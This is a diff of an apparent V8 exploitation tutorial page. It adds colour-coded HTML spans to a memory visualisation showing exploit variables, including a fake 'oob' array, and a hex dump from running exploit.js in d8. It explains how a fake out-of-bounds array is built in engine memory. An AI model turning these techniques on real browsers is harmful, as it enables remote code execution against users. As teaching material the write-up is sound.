@@ -837,29 +837,27 @@ We can then guess how the rest of the memory lines up and use offsets to set a f
 
 Once everything's set up we do the xor exploit thing and end up with the fake array in `tmp[0]`. We assign it to the `oob` variable for convenience and print its memory out in a format similar to the gdb output. Let's run it!
 
-
 <div class="jsMem">
 	<div class="jsMemTitle">VARS<div class="jsMemSep"></div></div>
-	<div class="jsMemDbg">arr = [5.43231e-312, 3.88113e-311, 5.43231e-312]
-tmpObj = {a: 1}
-objArr = [tmpObj]
-tmp = [oob]
-oob = [...]</div>
+	<div class="jsMemDbg"><span class="jsMemVar2">arr</span> = [5.43231e-312, <span class="jsMemVar0">3.88113e-311</span>, <span class="jsMemVar1">5.43231e-312</span>] // <span class="jsMemVar13">0x000432f9</span>
+<span class="jsMemVar3">tmpObj</span> = {<span class="jsMemVar15">a</span>: <span class="jsMemVar16">1</span>} // <span class="jsMemVar11">0x00043309</span>
+<span class="jsMemVar9">objArr</span> = <span class="jsMemVar10">[<span class="jsMemVar11">tmpObj</span>]</span> // <span class="jsMemVar14">0x00043341</span>
+<span class="jsMemVar0">oob</span> = [...] // <span class="jsMemVar12">0x000432e9</span></div>
 <div class="jsMemTitle">OUT<div class="jsMemSep"></div></div>
 	<div class="jsMemHex">$ ./d8 --allow-natives-syntax exploit.js
-0x000432e8: 0x00000725001cb7c5
-0x000432f0: 0x00000100000432e1
-0x000432f8: 0x00000725001cb7c5
-0x00043300: 0x00000006000432d9
-0x00043308: 0x00000725001d3b05
-0x00043310: 0x0000000200000725
+<span class="jsMemVar12">0x000432e8</span>: 0x<span class="jsMemVar0">00000725001cb7c5</span>
+0x000432f0: 0x<span class="jsMemVar1">00000100000432e1</span>
+<span class="jsMemVar13">0x000432f8</span>: 0x<span class="jsMemVar2">00000725001cb7c5</span>
+0x00043300: 0x<span class="jsMemVar2">00000006000432d9</span>
+<span class="jsMemVar11">0x00043308</span>: 0x<span class="jsMemVar3">00000725001d3b05</span>
+0x00043310: 0x<span class="jsMemVar16">00000002</span>00000725
 0x00043318: 0x0001000100000685
 0x00043320: 0x0000074d00000000
-0x00043328: 0x0000008400002af1
-0x00043330: 0x0000056d00000002
-0x00043338: 0x0004330900000002
-0x00043340: 0x00000725001cb845
-0x00043348: 0x0000000200043335
+0x00043328: 0x00000084<span class="jsMemVar15">00002af1</span>
+0x00043330: 0x<span class="jsMemVar10">0000056d</span>00000002
+0x00043338: 0x<span class="jsMemVar11">00043309</span><span class="jsMemVar10">00000002</span>
+<span class="jsMemVar14">0x00043340</span>: 0x<span class="jsMemVar9">00000725001cb845</span>
+0x00043348: 0x<span class="jsMemVar9">0000000200043335</span>
 ...</div>
 <div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
 <div class="jsMemLegend">
